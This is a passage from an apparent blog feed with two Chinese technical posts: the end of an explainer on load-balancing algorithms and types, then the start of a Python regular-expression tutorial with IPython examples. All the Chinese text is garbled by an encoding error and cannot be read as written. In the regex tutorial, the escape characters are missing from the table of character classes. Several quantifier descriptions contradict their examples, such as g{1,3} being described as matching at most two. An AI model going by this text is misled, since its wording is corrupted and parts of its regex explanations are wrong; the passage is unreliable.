F5ä»¥å¤–ï¼ŒRadwareã€Arrayã€A10ã€Ciscoã€æ·±ä¿¡æœå’Œåå¤åˆ›æ–°éƒ½æ˜¯è´Ÿè½½å‡è¡¡çš„ç‰Œå­ï¼Œå› ä¸ºF5 åœ¨è¿™ç±»äº§å“ä¸­å½±å“æœ€å¤§ï¼Œæ‰€ä»¥ç»å¸¸è¯´ F5 è´Ÿè½½å‡è¡¡ã€‚</p><h2 id="åº”ç”¨ç¨‹åºè´Ÿè½½å‡è¡¡å™¨é…ç½®æ–¹æ³•">åº”ç”¨ç¨‹åºè´Ÿè½½å‡è¡¡å™¨é…ç½®æ–¹æ³•</h2><p>äº†è§£è´Ÿè½½å‡è¡¡å™¨æ˜¯å¦‚ä½•å·¥ä½œçš„å¾ˆé‡è¦ï¼ŒåŒ…æ‹¬ WebæœåŠ¡å™¨è´Ÿè½½å‡è¡¡å™¨æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚å¯¹äºåˆå­¦è€…æ¥è¯´ï¼Œå­˜åœ¨å‡ ç§è´Ÿè½½å¹³è¡¡æ–¹æ³•ï¼Œä¹Ÿç§°ä¸ºè´Ÿè½½å¹³è¡¡æŠ€æœ¯ã€‚è¿™äº›æ–¹æ³•ä¾èµ–äºç¡®å®šæœåŠ¡å™¨ç¾¤ä¸­çš„å“ªä¸ªæœåŠ¡å™¨åº”è¯¥æ¥æ”¶æ¯ä¸ªå®¢æˆ·ç«¯è¯·æ±‚çš„ç®—æ³•ã€‚ä»¥ä¸‹æ˜¯äº”ç§æœ€å¸¸è§çš„è´Ÿè½½å¹³è¡¡æ–¹æ³•:</p><ol type="1"><li><p>Round Robinï¼ˆè½®è¯¢æ³•ï¼‰è½®è¯¢æ³•ä¾èµ–äºä¸€ä¸ªè½®æ¢ç³»ç»Ÿæ¥å¯¹ç½‘ç»œå’Œåº”ç”¨ç¨‹åºæµé‡è¿›è¡Œæ’åºã€‚å°†è¯·æ±‚æŒ‰é¡ºåºè½®æµåœ°åˆ†é…åˆ°åç«¯æœåŠ¡å™¨ä¸Šï¼Œå®ƒå‡è¡¡åœ°å¯¹å¾…åç«¯çš„æ¯ä¸€å°æœåŠ¡å™¨ï¼Œè€Œä¸å…³å¿ƒæœåŠ¡å™¨å®é™…çš„è¿æ¥æ•°å’Œå½“å‰çš„ç³»ç»Ÿè´Ÿè½½ã€‚è¿™ç§æ–¹æ³•é€‚ç”¨äºæœåŠ¡å™¨å¤„ç†èƒ½åŠ›ç›¸åŒï¼Œä¸”æ¯ç¬”ä¸šåŠ¡å¤„ç†é‡å·®å¼‚ä¸å¤§æ—¶ã€‚</p></li><li><p>IP Hashï¼ˆæºåœ°å€å“ˆå¸Œï¼‰ å®¢æˆ·ç«¯çš„ IPåœ°å€å†³å®šäº†å“ªä¸ªæœåŠ¡å™¨æ¥æ”¶å®ƒçš„è¯·æ±‚ã€‚æºåœ°å€å“ˆå¸Œçš„æ€æƒ³æ˜¯æ ¹æ®è·å–å®¢æˆ·ç«¯çš„ IPåœ°å€ï¼Œé€šè¿‡å“ˆå¸Œå‡½æ•°è®¡ç®—å¾—åˆ°çš„ä¸€ä¸ªæ•°å€¼ï¼Œç”¨è¯¥æ•°å€¼å¯¹æœåŠ¡å™¨åˆ—è¡¨çš„å¤§å°è¿›è¡Œå–æ¨¡è¿ç®—ï¼Œå¾—åˆ°çš„ç»“æœä¾¿æ˜¯å®¢æœç«¯è¦è®¿é—®æœåŠ¡å™¨çš„åºå·ã€‚é‡‡ç”¨æºåœ°å€å“ˆå¸Œæ³•è¿›è¡Œè´Ÿè½½å‡è¡¡ï¼ŒåŒä¸€IPåœ°å€çš„å®¢æˆ·ç«¯ï¼Œå½“åç«¯æœåŠ¡å™¨åˆ—è¡¨ä¸å˜æ—¶ï¼Œå®ƒæ¯æ¬¡éƒ½ä¼šæ˜ å°„åˆ°åŒä¸€å°åç«¯æœåŠ¡å™¨è¿›è¡Œè®¿é—®ã€‚</p></li><li><p>æœ€å°è¿æ¥ï¼ˆLeast Connectionsï¼‰æ­£å¦‚å…¶åç§°æ‰€ç¤ºï¼Œæœ€å°è¿æ¥æ–¹æ³•å°†æµé‡å¯¼å‘æ´»åŠ¨è¿æ¥æ•°é‡æœ€å°‘çš„æœåŠ¡å™¨ã€‚è¿™åœ¨æµé‡å¤§çš„æ—¶æœŸå¾ˆæœ‰ç”¨ï¼Œå› ä¸ºå®ƒæœ‰åŠ©äºåœ¨æ‰€æœ‰å¯ç”¨æœåŠ¡å™¨ä¹‹é—´ä¿æŒå‡åŒ€åˆ†å¸ƒã€‚</p></li><li><p>æœ€å°å“åº”æ—¶é—´ï¼ˆLeast Response Timeï¼‰æœ€å°å“åº”æ—¶é—´æ–¹æ³•å°†æµé‡å¯¼å‘åˆ°å…·æœ‰æœ€å°‘æ´»åŠ¨è¿æ¥é‡å’Œæœ€ä½å¹³å‡å“åº”æ—¶é—´çš„æœåŠ¡å™¨ã€‚</p></li><li><p>æœ€å°å¸¦å®½ï¼ˆLeast Bandwidthï¼‰ è¿™ç§åº”ç”¨è´Ÿè½½å‡è¡¡æ–¹æ³•ä»¥æ¯ç§’ Mbpsä¸ºå•ä½è®¡ç®—æµé‡ï¼Œå°†å®¢æˆ·ç«¯è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨çš„æµé‡æœ€å° Mbpsã€‚</p></li></ol><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16233939225336.jpg"alt="16233939225336" /><figcaption aria-hidden="true">16233939225336</figcaption></figure><h2 id="è´Ÿè½½å‡è¡¡ç±»å‹">è´Ÿè½½å‡è¡¡ç±»å‹</h2><p>å¯¹äºä¸€ä¸ªç½‘ç»œï¼Œå¯èƒ½éœ€è¦è€ƒè™‘è®¸å¤šç‰¹å®šç±»å‹çš„è´Ÿè½½å¹³è¡¡ï¼ŒåŒ…æ‹¬å…³ç³»æ•°æ®åº“çš„SQL Serverè´Ÿè½½å¹³è¡¡ã€è·¨å¤šä¸ªåœ°ç†ä½ç½®è¿›è¡Œæ•…éšœæ’é™¤çš„å…¨å±€æœåŠ¡å™¨è´Ÿè½½å¹³è¡¡ï¼Œä»¥åŠç¡®ä¿åŸŸååŠŸèƒ½çš„DNSæœåŠ¡å™¨è´Ÿè½½å¹³è¡¡ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥æ ¹æ®å„ç§å¯ç”¨çš„åŸºäºäº‘çš„è´Ÿè½½å‡è¡¡å™¨(åŒ…æ‹¬è‘—åçš„AWS å¼¹æ€§è´Ÿè½½å‡è¡¡å™¨)æ¥è€ƒè™‘è´Ÿè½½å‡è¡¡å™¨çš„ç±»å‹:</p><ol type="1"><li><p>ç½‘ç»œè´Ÿè½½å‡è¡¡ï¼ˆNetwork Load Balancingï¼‰ç½‘ç»œè´Ÿè½½å‡è¡¡åˆ©ç”¨ç½‘ç»œå±‚ä¿¡æ¯æ¥å†³å®šå°†ç½‘ç»œæµé‡å‘é€åˆ°å“ªé‡Œã€‚è¿™æ˜¯é€šè¿‡ç¬¬ 4å±‚è´Ÿè½½å‡è¡¡å®ç°çš„ï¼Œè¯¥è´Ÿè½½å‡è¡¡è¢«è®¾è®¡ç”¨æ¥å¤„ç†æ‰€æœ‰å½¢å¼çš„ TCP/UDPæµé‡ã€‚ç½‘ç»œè´Ÿè½½å¹³è¡¡è¢«è®¤ä¸ºæ˜¯æ‰€æœ‰è´Ÿè½½å¹³è¡¡è§£å†³æ–¹æ¡ˆä¸­é€Ÿåº¦æœ€å¿«çš„ï¼Œä½†æ˜¯å½“æ¶‰åŠåˆ°æœåŠ¡å™¨é—´æµé‡çš„å¹³è¡¡åˆ†é…æ—¶ï¼Œå®ƒå¾€å¾€è¾¾ä¸åˆ°è¦æ±‚ã€‚</p></li><li><p>HTTP(S)è´Ÿè½½å‡è¡¡ï¼ˆHTTP(S) Load Balancingï¼‰HTTP(S)è´Ÿè½½å‡è¡¡æ˜¯æœ€å¤è€çš„è´Ÿè½½å‡è¡¡å½¢å¼ä¹‹ä¸€ã€‚è¿™ç§è´Ÿè½½å¹³è¡¡å½¢å¼ä¾èµ–äºç¬¬ 7å±‚ï¼Œè¿™æ„å‘³ç€å®ƒåœ¨åº”ç”¨å±‚ä¸­è¿è¡Œã€‚HTTPè´Ÿè½½å¹³è¡¡é€šå¸¸è¢«ç§°ä¸ºæœ€çµæ´»çš„è´Ÿè½½å¹³è¡¡ç±»å‹ï¼Œå› ä¸ºå®ƒå…è®¸æ‚¨æ ¹æ® HTTPåœ°å€é™„å¸¦çš„ä»»ä½•ä¿¡æ¯å½¢æˆåˆ†å¸ƒå†³ç­–ã€‚</p></li><li><p>å†…éƒ¨è´Ÿè½½å‡è¡¡ï¼ˆInternal Load Balancingï¼‰å†…éƒ¨è´Ÿè½½å‡è¡¡ä¸ç½‘ç»œè´Ÿè½½å‡è¡¡å‡ ä¹ç›¸åŒï¼Œä½†æ˜¯å¯ä»¥ç”¨æ¥å¹³è¡¡å†…éƒ¨åŸºç¡€è®¾æ–½ã€‚</p></li></ol><p>åœ¨è®¨è®ºè´Ÿè½½å‡è¡¡å™¨ç±»å‹æ—¶ï¼Œè¿˜éœ€è¦æ³¨æ„ç¡¬ä»¶è´Ÿè½½å‡è¡¡å™¨ã€è½¯ä»¶è´Ÿè½½å‡è¡¡å™¨å’Œè™šæ‹Ÿè´Ÿè½½å‡è¡¡å™¨ã€‚</p><ol type="1"><li><p>ç¡¬ä»¶è´Ÿè½½å‡è¡¡å™¨ï¼ˆHardware Load Balancerï¼‰é¡¾åæ€ä¹‰ï¼Œç¡¬ä»¶è´Ÿè½½å‡è¡¡å™¨ä¾èµ–äºç‰©ç†çš„æœ¬åœ°ç¡¬ä»¶æ¥åˆ†å‘åº”ç”¨ç¨‹åºå’Œç½‘ç»œæµé‡ã€‚è¿™äº›è®¾å¤‡å¯ä»¥å¤„ç†å¤§é‡çš„æµé‡ï¼Œä½†å¾€å¾€ä»·æ ¼é«˜æ˜‚ï¼Œåœ¨çµæ´»æ€§æ–¹é¢ç›¸å½“æœ‰é™ã€‚</p></li><li><p>è½¯ä»¶è´Ÿè½½å‡è¡¡å™¨ï¼ˆSoftware Load Balancerï¼‰è½¯ä»¶è´Ÿè½½å‡è¡¡å™¨æœ‰ä¸¤ç§å½¢å¼ï¼šå•†ä¸šçš„æˆ–å¼€æºçš„ã€‚åœ¨ä½¿ç”¨ä¹‹å‰å¿…é¡»å®‰è£…ã€‚ä¸åŸºäºäº‘çš„å¹³è¡¡å™¨ä¸€æ ·ï¼Œè¿™äº›è§£å†³æ–¹æ¡ˆå¾€å¾€æ¯”ç¡¬ä»¶è§£å†³æ–¹æ¡ˆæ›´å®æƒ ã€‚</p></li><li><p>è™šæ‹Ÿè´Ÿè½½å‡è¡¡å™¨ï¼ˆVirtual Load Balancerï¼‰ä¸è½¯ä»¶è´Ÿè½½å‡è¡¡å™¨ä¸åŒçš„æ˜¯ï¼Œè™šæ‹Ÿè´Ÿè½½å‡è¡¡å™¨æ˜¯å°†ç¡¬ä»¶è´Ÿè½½å‡è¡¡è®¾å¤‡çš„è½¯ä»¶éƒ¨ç½²åœ¨è™šæ‹Ÿæœºä¸Šã€‚</p></li></ol><h2 id="æ€»ç»“">æ€»ç»“</h2><p>åº”ç”¨æœåŠ¡å™¨è´Ÿè½½å¹³è¡¡æ˜¯å°†å…¥ç«™ç½‘ç»œå’Œåº”ç”¨ç¨‹åºæµé‡åˆ†å¸ƒåˆ°å¤šä¸ªæœåŠ¡å™¨ä¸Šã€‚æ¯å¤©çš„æ¯åˆ†é’Ÿï¼Œéƒ½æœ‰æ•°ç™¾ä¸ªç”¨æˆ·æˆ–å®¢æˆ·æœºè¯·æ±‚ï¼Œä½¿å¾—ä»»ä½•ä¸€ä¸ªè´Ÿè½½å‡è¡¡å™¨æœåŠ¡å™¨éƒ½å¾ˆéš¾è·Ÿä¸Šæ•°æ®çš„éœ€æ±‚ã€‚åœ¨æœåŠ¡å™¨ä¹‹é—´åˆ†å‘è¿™äº›è¯·æ±‚æœ‰åŠ©äºç¡®ä¿æ­£å¸¸è¿è¡Œæ—¶é—´ï¼Œå¹¶å°†æ…¢é€Ÿä¿æŒåœ¨æœ€ä½é™åº¦ï¼Œä»¥ç¡®ä¿ç”¨æˆ·å’Œå‘˜å·¥æ»¡æ„ã€‚</p><h2 id="æ¨èé˜…è¯»">æ¨èé˜…è¯»</h2><p><ahref="https://www.cnblogs.com/kingreatwill/p/7991151.html#/cnblog/works/article/7991151">è´Ÿè½½å‡è¡¡åœ¨åˆ†å¸ƒå¼æ¶æ„ä¸­æ˜¯æ€ä¹ˆç©èµ·æ¥çš„ï¼Ÿ- kingreatwill - åšå®¢å›­</a></p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><ol type="1"><li><ahref="https://www.idongde.com/q/664b235129f2c12b/a1867860.shtml">è´Ÿè½½å‡è¡¡å’ŒF5 æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ - 150****3899 çš„å›ç­” - æ‡‚å¾—</a></li><li><ahref="https://www.dnsstuff.com/what-is-server-load-balancing">What IsLoad Balancing? Types, Configurations, and Best Tools -DNSstuff</a></li><li><a href="https://zhuanlan.zhihu.com/p/68733507">è´Ÿè½½å‡è¡¡çš„ 6ç§ç®—æ³•ï¼ŒNgnix çš„ 5 ç§ç®—æ³•ï¼ - çŸ¥ä¹</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python re å‡½æ•°æ“ä½œç»ƒä¹ </title>
      <link href="/blog/2021/06/16/programming/python/re_practice/"/>
      <url>/blog/2021/06/16/programming/python/re_practice/</url>
      
        <content type="html"><![CDATA[<h1 id="python-regexp-å‡½æ•°æ–¹æ³•">Python Regexp å‡½æ•°æ–¹æ³•</h1><h1 id="re-æ¨¡å—æ“ä½œ">3. re æ¨¡å—æ“ä½œ</h1><ol type="1"><li>re æ¨¡å—çš„ä½¿ç”¨è¿‡ç¨‹</li></ol><h1 id="åŒ¹é…å•ä¸ªå­—ç¬¦">4. åŒ¹é…å•ä¸ªå­—ç¬¦</h1><p>æ­£åˆ™è¡¨è¾¾å¼çš„å•å­—ç¬¦åŒ¹é…</p><table><thead><tr class="header"><th style="text-align: center;">å­—ç¬¦</th><th style="text-align: left;">åŠŸèƒ½</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">.</td><td style="text-align: left;">åŒ¹é…ä»»æ„ 1 ä¸ªå­—ç¬¦ï¼ˆé™¤äº†ï¼‰</td></tr><tr class="even"><td style="text-align: center;">[ ]</td><td style="text-align: left;">åŒ¹é…[ ]ä¸­åˆ—ä¸¾çš„å­—ç¬¦</td></tr><tr class="odd"><td style="text-align: center;"> åŒ¹é…æ•°å­—ï¼Œå³ 0-9</td><td style="text-align: left;"></td></tr><tr class="even"><td style="text-align: center;"></td><td style="text-align: left;">åŒ¹é…éæ•°å­—ï¼Œå³ä¸æ˜¯æ•°å­—</td></tr><tr class="odd"><td style="text-align: center;"></td><td style="text-align: left;">åŒ¹é…ç©ºç™½ï¼Œå³ç©ºæ ¼ï¼Œtab é”®</td></tr><tr class="even"><td style="text-align: center;"></td><td style="text-align: left;">åŒ¹é…éç©ºç™½</td></tr><tr class="odd"><td style="text-align: center;"></td><td style="text-align: left;">åŒ¹é…å•è¯å­—ç¬¦ï¼Œå³ azã€AZã€0-9ã€_</td></tr><tr class="even"><td style="text-align: center;"></td><td style="text-align: left;">åŒ¹é…éå•è¯å­—ç¬¦</td></tr></tbody></table><ul><li>ç‚¹ <code>.</code> åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦</li></ul><p>é…å•ä¸ªæ•°å­—</p><p>[12345678] åŒ¹é… 1-8 ä¸­ä»»æ„ä¸€ä¸ªæ•°å­—</p><p>[138] åŒ¹é… 1ã€3ã€8 ä¸­ä»»æ„ä¸€ä¸ªæ•°å­—</p><p>[1-8] åŒä¸Š</p><p>[1-36-8] s åŒ¹é… 1-3 æˆ– 6-8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">17</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…[12345678]&#x27;</span>,<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…4&#x27;</span>)</span><br><span class="line">Out[<span class="number">17</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…4&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">25</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…[1-8]&#x27;</span>,<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…35&#x27;</span>)</span><br><span class="line">Out[<span class="number">25</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…3&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">31</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…[1-36-8]&#x27;</span>,<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…7&#x27;</span>)</span><br><span class="line">Out[<span class="number">31</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…7&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>[1-8abcd] åŒ¹é…æ•°å­— 1-8 ä»¥åŠ aã€bã€cã€d å››ä¸ªå­—ç¬¦</p><p>[1-8a-d] åŒ¹é…æ•°å­— 1-8 ä»¥åŠ a-d</p><p>[1-8a-zA-Z] åŒ¹é…æ•°å­— 1-8 ä»¥åŠ a-z ä»¥åŠ A-Z</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">33</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…[1-8abcd]&#x27;</span>,<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…7&#x27;</span>)</span><br><span class="line">Out[<span class="number">33</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…7&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">38</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…[1-8a-d]&#x27;</span>,<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…a&#x27;</span>)</span><br><span class="line">Out[<span class="number">38</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…a&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">39</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…[1-8a-zA-Z]&#x27;</span>,<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…f&#x27;</span>)</span><br><span class="line">Out[<span class="number">39</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…f&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">40</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…[1-8a-zA-Z]&#x27;</span>,<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…K&#x27;</span>)</span><br><span class="line">Out[<span class="number">40</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…K&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>é…ä¸€ä¸ªæ•°å­—</p><p>åŒ¹é…ä¸€ä¸ª wordï¼Œå…¶ä¸­åŒ…æ‹¬ï¼ša-zï¼Œ A-Zï¼Œ0-9 è¿˜æœ‰ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰,æ­¤å¤–ï¼Œå®ƒè¿˜èƒ½åŒ¹é…ä¸­æ–‡ã€‚æ‰€ä»¥ä¸€èˆ¬ä¸ä½¿ç”¨å®ƒï¼Œä½¿ç”¨[a-zA-Z0-9_] æ¥ä»£æ›¿å®ƒ</p><p>åŒ¹é…ä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼Œå¦‚ï¼šç©ºæ ¼ã€ ç­‰</p><p>æ‰€æœ‰çš„å¤§å†™å­—æ¯éƒ½æ˜¯åŒ¹é…ä¸å°å†™ç›¸åçš„å­—ç¬¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">43</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…\w&#x27;</span>,<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…5&#x27;</span>)</span><br><span class="line">Out[<span class="number">43</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…5&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">44</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…\w&#x27;</span>,<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…_&#x27;</span>)</span><br><span class="line">Out[<span class="number">44</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…_&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">41</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…\w&#x27;</span>,<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…K&#x27;</span>)</span><br><span class="line">Out[<span class="number">41</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…K&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h1 id="åŒ¹é…å¤šä¸ªå­—ç¬¦">5. åŒ¹é…å¤šä¸ªå­—ç¬¦</h1><table><thead><tr class="header"><th style="text-align: center;">å­—ç¬¦</th><th style="text-align: left;">åŠŸèƒ½</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">*</td><td style="text-align: left;">åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦å‡ºç° 0æ¬¡æˆ–è€…æ— é™æ¬¡ï¼Œå³å¯æœ‰å¯æ— </td></tr><tr class="even"><td style="text-align: center;">+</td><td style="text-align: left;">åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦å‡ºç° 1æ¬¡æˆ–è€…æ— é™æ¬¡ï¼Œå³è‡³å°‘æœ‰ 1 æ¬¡</td></tr><tr class="odd"><td style="text-align: center;">?</td><td style="text-align: left;">åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦å‡ºç° 1 æ¬¡æˆ–è€… 0 æ¬¡ï¼Œå³è¦ä¹ˆæœ‰1 æ¬¡ï¼Œè¦ä¹ˆæ²¡æœ‰</td></tr><tr class="even"><td style="text-align: center;">{m}</td><td style="text-align: left;">åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦å‡ºç° m æ¬¡</td></tr><tr class="odd"><td style="text-align: center;">{m,n}</td><td style="text-align: left;">åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦å‡ºç°ä» m åˆ° n æ¬¡</td></tr></tbody></table><p>æœ€ç®€å•çš„æ€è·¯ï¼šå¤šå†™å‡ ä¸ªå•ä¸ªå­—ç¬¦åŒ¹é…å°±æˆäº†å¤šä¸ªå­—ç¬¦åŒ¹é…ã€‚</p><p>ç¼ºç‚¹ï¼šåªèƒ½åŒ¹é…æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦ï¼Œå¤šäº†å°‘äº†éƒ½ä¼šæŠ¥é”™ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">12</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…\d\d&#x27;</span>, <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…45&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">12</span>]: <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…45&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…\d\d&#x27;</span>, <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…4&#x27;</span>).group()</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">AttributeError                            Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">13</span>-bc99d57c6a2a&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…\d\d&#x27;</span>, <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…4&#x27;</span>).group()</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¤§æ‹¬å·æ¥é™åˆ¶å‰é¢çš„å•ä¸ªå­—ç¬¦æœ‰å¤šå°‘ä¸ªã€‚</p><p> åŒ¹é… 1 åˆ° 8 ä½æ•°å­—ï¼Œè‡³å°‘åŒ¹é… 1 ä¸ªæ•°å­—ï¼Œè‡³å¤šåŒ¹é… 4 ä¸ªæ•°å­—</p><p> åŒ¹é… 11 ä¸ªè¿ç»­çš„æ•°å­—ï¼Œä¸­é—´ä¸èƒ½æœ‰åˆ«çš„å­—ç¬¦ã€‚</p><p>g{1,3} åŒ¹é…è‡³å°‘ 1 ä¸ªï¼Œè‡³å¤š 2 ä¸ªå­—ç¬¦ g</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">15</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…\d&#123;1,2&#125;&#x27;</span>, <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…3&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">15</span>]: <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…3&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…\d&#123;1,2&#125;&#x27;</span>, <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…45&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">16</span>]: <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…45&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">17</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…\d&#123;4&#125;&#x27;</span>, <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…4568&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">17</span>]: <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…4568&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: 